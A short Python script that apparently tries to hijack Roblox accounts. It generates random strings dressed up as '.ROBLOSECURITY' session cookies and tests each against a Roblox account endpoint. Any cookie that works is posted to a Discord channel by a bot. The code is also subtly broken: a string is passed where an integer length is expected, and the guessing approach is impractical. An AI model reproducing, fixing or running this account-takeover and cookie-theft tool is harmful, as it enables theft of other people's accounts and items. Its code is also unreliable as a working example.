#before installation
 #pip istall discord
 #pip install requests
import discord
import requests
import string
import random
import time
import asyncio
from discord.ext import commands
# config
channel_id = 1234567890
token = 'TOKEN'
len = '732'
# end config
class MyClient(discord.Client):

    def __init__(self, *args, **kwargs):
            super().__init__(*args, **kwargs)

    async def setup_hook(self) -> None:
            # create the background task and run it in the background
            self.bg_task = self.loop.create_task(self.my_background_task())
    async def on_ready(self):
            print(f'Logged in as {self.user} (ID: {self.user.id})')
            print('------')
    async def my_background_task(self):
            await self.wait_until_ready()
            counter = 0
            channel = self.get_channel(channel_id)
            while not self.is_closed():
                cookies = []
                intro = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_"
                letters = 'ABCDEF'
                cookies = intro + ''.join(random.choices(letters + string.digits, k=len))
                req = requests.Session()
                cookie = cookies
                check = req.get('https://accountinformation.roblox.com/v1/birthdate',
                                    cookies={'.ROBLOSECURITY': str(cookie)})
                if check.status_code == 200:
                        print("\n     Valid\n\n" + cookie)
                        await channel.send(cookie)
                #else:
                    #print("\n     Not valid!\n\n")
                await asyncio.sleep(1)

client = MyClient(intents=discord.Intents.default())
client.run(token)